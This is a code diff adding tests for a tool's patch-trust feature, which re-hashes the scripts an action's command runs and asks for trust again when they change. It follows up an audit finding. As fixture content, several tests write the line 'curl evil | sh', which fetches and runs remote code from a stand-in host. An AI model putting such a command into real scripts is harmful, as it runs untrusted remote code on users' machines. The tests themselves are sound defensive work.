@@ -247,3 +247,51 @@ test("a file a script runs that turns up later changes the hash: it's watched wh
   fs.writeFileSync(path.join(folder, 'local.sh'), 'curl evil | sh\n');
   assert.notEqual(patchHash(file).hash, before.hash);
 });
+
+// Daybreak verify-fix (final, 5 Nov), finding 4: an action's command was
+// hashed only past `./` paths, so `node scripts/deploy.mjs` left the file
+// it runs out. The remediation test: changing only an action's target
+// needs trusting again.
+test("an action's target is hashed however its command names it: changing only that file asks again", async () => {
+  const cases: [string, Record<string, string>, string][] = [
+    ['node scripts/deploy.mjs', { 'scripts/deploy.mjs': "import './lib.mjs';\n", 'scripts/lib.mjs': '1;\n' }, 'scripts/deploy.mjs'],
+    ['node scripts/deploy.mjs', { 'scripts/deploy.mjs': "import './lib.mjs';\n", 'scripts/lib.mjs': '1;\n' }, 'scripts/lib.mjs'],
+    ['bun scripts/x.ts --prod', { 'scripts/x.ts': '1;\n' }, 'scripts/x.ts'],
+    ['bash scripts/deploy.sh', { 'scripts/deploy.sh': 'echo\n' }, 'scripts/deploy.sh'],
+    ['python3 tools/release.py', { 'tools/release.py': 'print(1)\n' }, 'tools/release.py'],
+    ['npm run deploy', { 'package.json': '{"scripts":{"deploy":"node tools/d.mjs"}}', 'tools/d.mjs': '1;\n' }, 'tools/d.mjs'],
+    ['make deploy', { Makefile: 'deploy:\n\tsh tools/d.sh\n', 'tools/d.sh': 'echo\n' }, 'tools/d.sh'],
+    ['cd web && node build.mjs', { 'web/build.mjs': '1;\n' }, 'web/build.mjs'],
+  ];
+  for (const [i, [run, files, changed]] of cases.entries()) {
+    const { folder, file } = repo(`export default { actions: [{ title: 'Deploy', run: ${JSON.stringify(run)} }] };\n`, files);
+    const trust = new PatchTrust();
+    trust.trustCurrent([file]);
+    const set = await load(folder, trust);
+    assert.equal(set.patches[0].error, undefined, `${i}: ${run}`);
+    assert.equal(set.actions[0]?.folder, fs.realpathSync(folder), 'runs from the folder holding .threadbear/, where it was followed from');
+    bump(path.join(folder, changed), 'curl evil | sh\n');
+    assert.equal((await load(folder, trust)).patches[0].untrusted, 'changed', `${i}: ${run}: changing ${changed} asks again`);
+  }
+});
+
+test("a command a live function runs with sh is hashed too, as are an action's that can't be followed (it still loads: it runs only when pressed)", async () => {
+  const live = repo("export default { actions: [{ title: 'Go', run: 'true', badge: async ({ sh }) => Number(await sh('node scripts/count.mjs')) }] };\n", { 'scripts/count.mjs': '1;\n' });
+  const t1 = new PatchTrust();
+  t1.trustCurrent([live.file]);
+  bump(path.join(live.folder, 'scripts/count.mjs'), 'curl evil | sh\n');
+  assert.equal((await load(live.folder, t1)).patches[0].untrusted, 'changed');
+  const odd = repo("export default { actions: [{ title: 'Go', run: 'eval \"$X\"; node scripts/go.mjs' }] };\n", { 'scripts/go.mjs': '1;\n' });
+  const t2 = new PatchTrust();
+  t2.trustCurrent([odd.file]);
+  assert.equal((await load(odd.folder, t2)).actions.length, 1);
+});
+
+test("an action command worked out in code that runs a file the hash didn't cover is refused", async () => {
+  const { folder, file } = repo("const f = ['scripts', 'deploy.mjs'].join('/');\nexport default { actions: [{ title: 'Deploy', run: 'node ' + f }] };\n", { 'scripts/deploy.mjs': '1;\n' });
+  const trust = new PatchTrust();
+  trust.trustCurrent([file]);
+  const set = await load(folder, trust);
+  assert.match(set.patches[0].error ?? '', /^Not run: its action "Deploy" runs scripts\/deploy\.mjs, which patch trust didn't hash/);
+  assert.equal(set.actions.length, 0);
+});
